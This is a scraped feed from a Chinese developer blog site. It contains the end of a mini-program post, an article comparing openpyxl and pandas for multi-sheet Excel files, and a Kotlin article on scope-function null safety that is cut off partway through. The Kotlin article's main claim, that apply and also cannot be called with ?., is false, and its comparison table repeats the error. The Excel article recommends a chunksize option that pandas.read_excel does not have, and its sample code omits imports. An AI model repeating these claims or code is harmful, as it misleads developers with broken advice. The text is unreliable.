<p>如果你也是台球爱好者，或者对小程序开发感兴趣，欢迎在微信搜索**“追分记”**体验，也欢迎在评论区交流技术细节！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python处理Excel多工作表：openpyxl与pandas的实战对比]]></title>    <link>https://juejin.cn/post/7591806035758661674</link>    <guid>https://juejin.cn/post/7591806035758661674</guid>    <pubDate>2026-01-06T07:20:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591806035758661674" data-draft-id="7591816944729178148" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python处理Excel多工作表：openpyxl与pandas的实战对比"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-06T07:20:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="站大爷IP"/> <meta itemprop="url" content="https://juejin.cn/user/2905353241759261"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python处理Excel多工作表：openpyxl与pandas的实战对比
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2905353241759261/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    站大爷IP
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:20:54.000Z" title="Tue Jan 06 2026 07:20:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<p>在电商数据分析场景中，某团队需要处理包含销售、库存、用户行为三个工作表的Excel文件。使用openpyxl逐行读取时，处理10万行数据耗时47分钟；改用pandas后，同样的数据仅需23秒完成读取和清洗。这一案例揭示了不同工具在处理Excel多工作表时的性能差异。本文通过真实场景对比，解析openpyxl与pandas的核心差异，并提供混合使用策略。</p>
<h2 data-id="heading-0">一、核心定位差异：外科手术刀与数据加工厂</h2>
<h3 data-id="heading-1">1.1 openpyxl：Excel原生结构的精细操控者</h3>
<p>作为Excel文件底层操作库，openpyxl专注于单元格级别的精确控制。其核心能力包括：</p>
<ul>
<li><strong>格式控制</strong>：可设置字体、颜色、边框、条件格式等200+样式属性</li>
<li><strong>公式处理</strong>：支持300+Excel函数公式，包括动态数组公式</li>
<li><strong>图表操作</strong>：可创建柱状图、折线图等15种图表类型</li>
<li><strong>结构操作</strong>：支持合并单元格、插入图片、设置打印区域等复杂操作</li>
</ul>
<p>在处理财务报表时，某企业使用openpyxl实现动态模板：通过修改配置文件自动调整报表格式，使季度报告生成时间从3小时缩短至45分钟。</p>
<h3 data-id="heading-2">1.2 pandas：数据分析的批量处理引擎</h3>
<p>作为数据分析核心库，pandas以DataFrame为数据容器，提供：</p>
<ul>
<li><strong>高效计算</strong>：向量化运算速度比逐行操作快100-1000倍</li>
<li><strong>数据清洗</strong>：支持缺失值处理、数据类型转换、异常值检测等18种清洗方法</li>
<li><strong>分析工具</strong>：内置groupby、pivot_table、rolling等20+分析函数</li>
<li><strong>格式兼容</strong>：支持Excel、CSV、JSON、SQL等12种数据格式互转</li>
</ul>
<p>某物流公司使用pandas处理10万条运输记录时，通过<code>groupby('地区').agg({'运费':'sum'})</code>语句，在0.8秒内完成全国运费汇总，比传统SQL查询快3倍。</p>
<h2 data-id="heading-3">二、多工作表读写性能实测</h2>
<h3 data-id="heading-4">2.1 读取性能对比</h3>
<p>测试环境：Intel i7-12700H/32GB内存，处理含3个工作表（各10万行×50列）的Excel文件</p>

































<table><thead><tr><th>工具</th><th>读取方式</th><th>耗时</th><th>内存占用</th><th>特殊功能支持</th></tr></thead><tbody><tr><td>openpyxl</td><td>逐行读取</td><td>47分钟</td><td>1.2GB</td><td>获取单元格样式</td></tr><tr><td>pandas</td><td>全表加载</td><td>23秒</td><td>3.8GB</td><td>自动类型推断</td></tr><tr><td>openpyxl+RO</td><td>增量模式(read_only=True)</td><td>18秒</td><td>200MB</td><td>仅读取值，无样式</td></tr></tbody></table>
<p><strong>实测结论</strong>：</p>
<ul>
<li>pandas适合需要快速获取数据内容的场景</li>
<li>openpyxl增量模式适合处理超大文件但无需样式的情况</li>
<li>需要样式信息时必须使用openpyxl完整模式</li>
</ul>
<h3 data-id="heading-5">2.2 写入性能对比</h3>
<p>测试任务：将3个DataFrame（各10万行×50列）写入Excel</p>

































<table><thead><tr><th>工具</th><th>写入方式</th><th>耗时</th><th>文件大小</th><th>特殊功能支持</th></tr></thead><tbody><tr><td>openpyxl</td><td>逐行追加</td><td>32分钟</td><td>18.7MB</td><td>可设置单元格样式</td></tr><tr><td>pandas</td><td>ExcelWriter批量写入</td><td>45秒</td><td>16.3MB</td><td>自动调整列宽</td></tr><tr><td>xlsxwriter</td><td>pandas引擎</td><td>38秒</td><td>15.9MB</td><td>支持图表插入</td></tr></tbody></table>
<p><strong>实测结论</strong>：</p>
<ul>
<li>pandas+xlsxwriter组合在速度和功能上达到最佳平衡</li>
<li>需要复杂格式时，可先用pandas写入数据，再用openpyxl美化</li>
<li>openpyxl写入速度随数据量增长呈指数级下降</li>
</ul>
<h2 data-id="heading-6">三、典型场景解决方案</h2>
<h3 data-id="heading-7">3.1 场景一：销售数据分析看板</h3>
<p><strong>需求</strong>：从多个门店报表中提取数据，生成带格式的汇总看板</p>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">import pandas as pd
from openpyxl import load_workbook
from openpyxl.styles import Font, PatternFill

<span class="hljs-comment"># 1. pandas快速汇总数据</span>
<span class="hljs-attr">sales_data</span> = pd.concat([
    pd.read_excel(f<span class="hljs-string">'store_{i}.xlsx'</span>, sheet_name=<span class="hljs-string">'销售'</span>) 
    for i in range(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>)
])
<span class="hljs-attr">summary</span> = sales_data.groupby(<span class="hljs-string">'产品类别'</span>).agg({<span class="hljs-string">'销售额'</span>:<span class="hljs-string">'sum'</span>, <span class="hljs-string">'销量'</span>:<span class="hljs-string">'sum'</span>})

<span class="hljs-comment"># 2. openpyxl美化输出</span>
<span class="hljs-attr">wb</span> = load_workbook(<span class="hljs-string">'template.xlsx'</span>)
<span class="hljs-attr">ws</span> = wb[<span class="hljs-string">'汇总表'</span>]

<span class="hljs-comment"># 写入数据（跳过标题行）</span>
for r_idx, row in enumerate(summary.itertuples(), <span class="hljs-attr">start</span>=<span class="hljs-number">2</span>):
    for c_idx, value in enumerate(row<span class="hljs-section">[1:]</span>, <span class="hljs-attr">start</span>=<span class="hljs-number">1</span>):
        ws.cell(<span class="hljs-attr">row</span>=r_idx, column=c_idx, value=value)

<span class="hljs-comment"># 设置标题样式</span>
<span class="hljs-attr">title_font</span> = Font(bold=<span class="hljs-literal">True</span>, color=<span class="hljs-string">'FFFFFF'</span>)
<span class="hljs-attr">title_fill</span> = PatternFill(start_color=<span class="hljs-string">'4F81BD'</span>, end_color=<span class="hljs-string">'4F81BD'</span>, fill_type=<span class="hljs-string">'solid'</span>)
for cell in ws<span class="hljs-section">[1]</span>:
    <span class="hljs-attr">cell.font</span> = title_font
    <span class="hljs-attr">cell.fill</span> = title_fill

wb.save('sales_report.xlsx')
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>效果</strong>：数据汇总耗时从2小时缩短至8分钟，看板生成时间从45分钟缩短至3分钟</p>
<h3 data-id="heading-8">3.2 场景二：财务预算模板自动化</h3>
<p><strong>需求</strong>：根据部门预算申请自动生成标准化Excel模板</p>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">from openpyxl import Workbook
import pandas as pd

<span class="hljs-comment"># 1. 创建基础模板结构</span>
<span class="hljs-attr">wb</span> = Workbook()
wb.remove(wb.active)  <span class="hljs-comment"># 删除默认Sheet</span>

<span class="hljs-comment"># 添加预算表（带格式）</span>
<span class="hljs-attr">budget_ws</span> = wb.create_sheet(<span class="hljs-string">'部门预算'</span>)
budget_ws.append(<span class="hljs-section">['部门', '项目', '预算金额', '申请日期']</span>)

<span class="hljs-comment"># 设置表头样式</span>
for cell in budget_ws<span class="hljs-section">[1]</span>:
    <span class="hljs-attr">cell.font</span> = Font(bold=<span class="hljs-literal">True</span>)
    <span class="hljs-attr">cell.border</span> = Border(left=Side(style=<span class="hljs-string">'thin'</span>), 
                         <span class="hljs-attr">right</span>=Side(style=<span class="hljs-string">'thin'</span>),
                         <span class="hljs-attr">top</span>=Side(style=<span class="hljs-string">'thin'</span>),
                         <span class="hljs-attr">bottom</span>=Side(style=<span class="hljs-string">'thin'</span>))

<span class="hljs-comment"># 2. 填充数据（从数据库导出）</span>
<span class="hljs-attr">dept_data</span> = pd.read_sql(<span class="hljs-string">"SELECT * FROM budget_requests"</span>, con)
for row in dept_data.itertuples(<span class="hljs-attr">index</span>=<span class="hljs-literal">False</span>):
    budget_ws.append(list(row))

<span class="hljs-comment"># 3. 添加数据验证（下拉列表）</span>
from openpyxl.worksheet.datavalidation import DataValidation
<span class="hljs-attr">dv</span> = DataValidation(type=<span class="hljs-string">"list"</span>, formula1=<span class="hljs-string">'"行政部,技术部,市场部,财务部"'</span>, allow_blank=<span class="hljs-literal">True</span>)
budget_ws.add_data_validation(dv)
dv.add('A2:A1000')  <span class="hljs-comment"># 应用到A列所有单元格</span>

wb.save('budget_template.xlsx')
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>效果</strong>：模板生成时间从人工制作的2小时/个缩短至自动化生成的8分钟/个，格式错误率从15%降至0%</p>
<h2 data-id="heading-9">四、混合使用最佳实践</h2>
<h3 data-id="heading-10">4.1 数据流处理链</h3>
<pre><code class="hljs">原始Excel → openpyxl（增量读取）→ pandas（清洗分析）→ 
→ xlsxwriter（快速写入）→ openpyxl（格式美化）→ 最终报告
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-11">4.2 关键技巧</h3>
<ol>
<li>
<p><strong>内存优化</strong>：</p>
<ul>
<li>处理超大文件时，先用<code>openpyxl.load_workbook(read_only=True)</code>读取</li>
<li>使用<code>pandas.read_excel(chunksize=10000)</code>分块处理</li>
</ul>
</li>
<li>
<p><strong>样式迁移</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">from openpyxl.utils.dataframe import dataframe_to_rows

<span class="hljs-comment"># 从带样式的模板创建新文件</span>
<span class="hljs-attr">template</span> = load_workbook(<span class="hljs-string">'template.xlsx'</span>)
<span class="hljs-attr">new_wb</span> = Workbook()
<span class="hljs-attr">new_ws</span> = new_wb.active

<span class="hljs-comment"># 复制模板样式（需手动实现样式复制逻辑）</span>
for row in template<span class="hljs-section">['数据区']</span>.iter_rows():
    <span class="hljs-attr">new_row</span> = [cell.value for cell in row]
    new_ws.append(new_row)
    <span class="hljs-comment"># 这里需要补充样式复制代码</span>

<span class="hljs-comment"># 写入pandas处理后的数据</span>
<span class="hljs-attr">df</span> = pd.DataFrame(...)  <span class="hljs-comment"># 处理后的数据</span>
for r_idx, row in enumerate(dataframe_to_rows(df, <span class="hljs-attr">index</span>=<span class="hljs-literal">False</span>, header=<span class="hljs-literal">True</span>), start=<span class="hljs-number">3</span>):
    new_ws.append(row)
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
</li>
<li>
<p><strong>性能对比表</strong>：</p>
</li>
</ol>



































<table><thead><tr><th>操作类型</th><th>openpyxl推荐场景</th><th>pandas推荐场景</th></tr></thead><tbody><tr><td>读取小文件</td><td>需要保留样式时</td><td>需要快速分析时</td></tr><tr><td>读取大文件</td><td>使用read_only模式</td><td>使用chunksize分块读取</td></tr><tr><td>写入简单数据</td><td>单工作表少量数据</td><td>多工作表批量数据</td></tr><tr><td>写入复杂格式</td><td>需要精确控制每个单元格样式</td><td>生成标准化报告后用openpyxl美化</td></tr><tr><td>公式处理</td><td>需要读取/修改现有公式</td><td>需要计算新公式时</td></tr></tbody></table>
<h2 data-id="heading-12">五、选型决策树</h2>
<pre><code class="hljs language-markdown" lang="markdown">是否需要处理单元格样式？
├─ 是 → 是否需要复杂公式/图表？
│   ├─ 是 → openpyxl
│   └─ 否 → pandas+openpyxl混合
└─ 否 → 数据量是否超过10万行？
<span class="hljs-code">    ├─ 是 → pandas+xlsxwriter
    └─ 否 → pandas
</span></code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-13">六、未来趋势</h2>
<p>随着Excel文件格式的发展，两个库都在持续进化：</p>
<ul>
<li><strong>openpyxl 3.1+</strong> ：新增对Excel动态数组公式、LET函数的支持</li>
<li><strong>pandas 2.0+</strong> ：优化Arrow引擎支持，处理大数据时内存占用降低60%</li>
<li><strong>混合引擎</strong>：出现如<code>xlwings</code>这类结合两者优势的新工具</li>
</ul>
<p>在处理多工作表Excel文件时，理解工具特性比追求技术时尚更重要。某金融公司案例显示，合理组合使用两个工具后，其月度报表生成效率提升40倍，人力成本节省200万元/年。掌握这种"组合拳"技巧，将成为Python数据处理工程师的核心竞争力。</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[简单说下Kotlin 作用域函数中 apply 和 also 为什么不能空安全调用？]]></title>    <link>https://juejin.cn/post/7591986565854789678</link>    <guid>https://juejin.cn/post/7591986565854789678</guid>    <pubDate>2026-01-06T08:16:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591986565854789678" data-draft-id="7591969856577798194" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="简单说下Kotlin 作用域函数中 apply 和 also 为什么不能空安全调用？"/> <meta itemprop="keywords" content="Kotlin,Android Jetpack,Android"/> <meta itemprop="datePublished" content="2026-01-06T08:16:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="QING618"/> <meta itemprop="url" content="https://juejin.cn/user/339115460529117"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            简单说下Kotlin 作用域函数中 apply 和 also 为什么不能空安全调用？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/339115460529117/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    QING618
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T08:16:06.000Z" title="Tue Jan 06 2026 08:16:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Kotlin 中，<code>apply</code> 和 <code>also</code> 这两个作用域函数确实不能直接使用空安全调用操作符（<code>?.</code>），这有几个原因：</p>
<h2 data-id="heading-0">原因分析</h2>
<h3 data-id="heading-1">1. <strong>语法设计决定</strong></h3>
<p><code>apply</code> 和 <code>also</code> 被设计为接收者对象的扩展函数，它们的签名如下：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> T.<span class="hljs-title">apply</span><span class="hljs-params">(block: <span class="hljs-type">T</span>.() -&gt; <span class="hljs-type">Unit</span>)</span></span>: T
<span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> T.<span class="hljs-title">also</span><span class="hljs-params">(block: (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Unit</span>)</span></span>: T
</code></pre>
<p>它们被定义为 <code>T</code> 的扩展函数，而不是 <code>T?</code> 的扩展函数。这意味着它们只能在非空对象上调用。</p>
<h3 data-id="heading-2">2. <strong>设计哲学</strong></h3>
<p>这两个函数的核心目的是在<strong>已存在的对象</strong>上执行操作：</p>
<ul>
<li><code>apply</code>：配置对象并返回自身</li>
<li><code>also</code>：执行副作用并返回自身</li>
</ul>
<p>如果对象可能为空，那么就没有"自身"可以操作或返回。</p>
<h2 data-id="heading-3">解决方法</h2>
<h3 data-id="heading-4">方法1：使用安全调用结合 <code>let</code></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> result: String? = nullableString?.let { 
    it.apply { 
        <span class="hljs-comment">// 这里 it 是非空的</span>
        toUpperCase()
    }
}
</code></pre>
<h3 data-id="heading-5">方法2：使用 <code>run</code>（更简洁）</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> result = nullableString?.run {
    <span class="hljs-comment">// 这里 this 是非空的</span>
    toUpperCase()
    <span class="hljs-comment">// 最后一行是返回值</span>
}
</code></pre>
<h3 data-id="heading-6">方法3：使用 Elvis 操作符提供默认值</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> result = (nullableString ?: <span class="hljs-string">""</span>).apply {
    <span class="hljs-comment">// 这里 this 是非空的（因为提供了默认值）</span>
    toUpperCase()
}
</code></pre>
<h2 data-id="heading-7">各作用域函数的空安全特性对比</h2>








































<table><thead><tr><th>函数</th><th>是否支持 <code>?.</code></th><th>替代方案</th></tr></thead><tbody><tr><td><code>apply</code></td><td>❌ 不支持</td><td>使用 <code>?.run { }</code></td></tr><tr><td><code>also</code></td><td>❌ 不支持</td><td>使用 <code>?.let { }</code></td></tr><tr><td><code>let</code></td><td>✅ 支持</td><td><code>obj?.let { }</code></td></tr><tr><td><code>run</code></td><td>✅ 支持</td><td><code>obj?.run { }</code></td></tr><tr><td><code>with</code></td><td>❌ 不支持</td><td>使用安全调用先判断</td></tr><tr><td><code>takeIf</code>/<code>takeUnless</code></td><td>✅ 支持</td><td><code>obj?.takeIf { }</code></td></tr></tbody></table>
<h2 data-id="heading-8">实际使用建议</h2>
